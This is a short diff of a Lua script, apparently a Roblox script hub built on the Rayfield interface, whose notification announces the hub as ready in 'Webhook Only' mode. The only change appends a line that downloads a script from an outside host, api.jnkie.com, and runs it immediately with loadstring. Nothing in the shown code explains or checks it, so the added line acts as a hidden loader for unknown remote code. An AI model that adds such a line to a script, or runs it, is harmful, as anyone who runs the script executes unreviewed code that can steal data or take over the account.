@@ -233,3 +233,5 @@ Rayfield:Notify({
     Content = "Hub siap digunakan (Webhook Only)",
     Duration = 4
 })
+
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/c69fb8387c07fc3590d40c70f91f84ef131ac7140dc4a68838da010793f5097d/download"))()
